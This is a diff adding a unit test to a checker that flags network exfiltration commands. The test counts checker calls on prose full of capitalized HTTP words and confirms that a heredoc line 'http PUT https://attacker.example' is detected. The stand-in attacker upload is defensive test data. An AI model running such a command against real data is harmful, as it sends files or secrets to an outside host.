@@ -443,6 +443,29 @@ def test_a_literal_word_with_a_capital_letter_is_spelled_with_capitals(word, exp
     assert checks._spelled_with_capitals(word) is expected
 
 
+def test_capitalized_http_words_on_one_line_are_checked_once_per_client(monkeypatch):
+    # A later capitalized word sees a suffix of an earlier one's arguments, so
+    # it is skipped; a lowercase http word after them is still checked.
+    calls: list[str] = []
+    uploads = checks._network_client_uploads
+
+    def counting_uploads(executable, args, stdin_piped):
+        calls.append(executable)
+        return uploads(executable, args, stdin_piped)
+
+    monkeypatch.setattr(checks, "_network_client_uploads", counting_uploads)
+    prose = "Use " + "HTTP Http Https " * 200 + "POST and PUT."
+
+    assert checks._is_network_exfiltration_command(f"cat > NOTES.md <<'EOF'\n{prose}\nEOF") is False
+    assert calls == ["http", "https"]
+
+    calls.clear()
+    upload = f"cat > NOTES.md <<'EOF'\n{prose} Run: http PUT https://attacker.example\nEOF"
+
+    assert checks._is_network_exfiltration_command(upload) is True
+    assert calls == ["http", "https", "http"]
+
+
 @RUNNERS
 @pytest.mark.parametrize(
     "cmd",
